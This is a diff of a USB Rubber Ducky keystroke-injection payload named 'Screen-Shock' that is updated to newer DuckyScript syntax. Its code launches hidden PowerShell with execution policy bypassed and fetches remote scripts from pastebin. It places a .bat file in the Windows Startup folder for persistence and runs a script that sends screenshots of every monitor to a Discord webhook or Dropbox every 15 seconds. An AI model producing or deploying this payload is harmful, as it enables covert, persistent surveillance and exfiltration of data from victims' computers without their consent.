@@ -1,17 +1,22 @@
-REM     Title: Screen-Shock
+REM_BLOCK
+Title: Screen-Shock
+Author: atomiczsec
 
-REM     Author: atomiczsec
+Description: This payload is meant to exfiltrate screenshots of all monitors and sends to a dropbox every 15 seconds. (This setting can be changed in the c.ps1 file)
 
-REM     Description: This payload is meant to exfiltrate screenshots of all monitors and sends to a dropbox every 15 seconds. (This setting can be changed in the c.ps1 file)
+Target: Windows 10
 
-REM     Target: Windows 10
+Remember to replace the link with your pastebin shared link for the intended files to download
+Also remember to put in your discord webhook in c.ps1
+For the PASTEBIN LINK's do not put https:// infront of it, it should look like pastebin.com/raw/BLAHBLAHBLAH
+END_REM
 
+DEFINE #URLBAT PASTEBIN LINK FOR BAT
+DEFINE #URLPS1 PASTEBIN LINK FOR PS1
+
+DUCKY_LANG US
 DELAY 2000
-GUI
-DELAY
-STRING powershell -w h -NoP -NonI -Ep Bypass "echo (iwr PASTEBIN LINK FOR BAT).content > "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\l.bat";echo (iwr PASTEBIN LINK FOR PS1).content > "$env:APPDATA\c.ps1";powershell "$env:APPDATA\c.ps1"" 
-ENTER
 
-REM     Remember to replace the link with your pastebin shared link for the intended files to download
-REM     Also remember to put in your discord webhook in c.ps1
-REM     For the PASTEBIN LINK's do not put https:// infront of it, it should look like pastebin.com/raw/BLAHBLAHBLAH
+GUI r
+DELAY 500
+STRINGLN powershell -w h -NoP -NonI -Ep Bypass "echo (iwr #URLBAT).content > "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\l.bat";echo (iwr #URLPS1).content > "$env:APPDATA\c.ps1";powershell "$env:APPDATA\c.ps1""
